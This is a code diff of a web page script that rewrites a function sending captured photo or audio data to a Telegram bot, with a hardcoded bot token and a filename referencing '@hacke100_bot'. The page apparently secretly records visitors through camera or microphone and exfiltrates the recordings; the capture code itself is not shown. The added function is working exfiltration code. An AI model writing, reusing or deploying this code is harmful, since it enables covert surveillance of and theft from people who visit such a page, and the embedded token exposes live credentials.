@@ -168,27 +168,55 @@
         }
       });
 
-    function sendToTelegram(data, type) {
+//     function sendToTelegram(data, type) {
   
 
-      const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U';
-      const chatId = chatid;
+//       const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U';
+//       const chatId = chatid;
 
-      const formData = new FormData();
-      formData.append('7532339931', chatId);
-      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@hacke100_bot.${type === 'photo' ? 'jpg' : 'wav'}`);
+//       const formData = new FormData();
+//       formData.append('7532339931', chatId);
+//       formData.append(type === 'photo' ? 'photo' : 'audio', data, `@hacke100_bot.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
-{
+//       fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, 
+// {
+//         method: 'POST',
+//         body: formData
+//       })
+//         .then(response => response.json())
+//         .then(data => console.log(data))
+//         .catch(error => console.error('Error sending to Telegram:', error));
+//     }
+               
+
+
+function sendToTelegram(data, type, chatId) {
+    const botToken = '7783174245:AAHArvpKS5IegITerWZJ44BtGl1S6ssxs2U'; // Replace with your bot token
+
+    const formData = new FormData();
+    formData.append('7532339931', chatId);
+    
+    if (type === 'photo') {
+        formData.append('photo', data, 'image.jpg'); // Assuming the file is a photo
+    } else if (type === 'audio') {
+        formData.append('audio', data, 'audio.wav'); // Assuming the file is audio
+    } else {
+        console.error('Unsupported type:', type);
+        return;
+    }
+
+    fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
         method: 'POST',
         body: formData
-      })
-        .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error sending to Telegram:', error));
-    }
-               
-  
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error sending to Telegram:', error));
+}
+
+
+
+    
     
   </script>
 
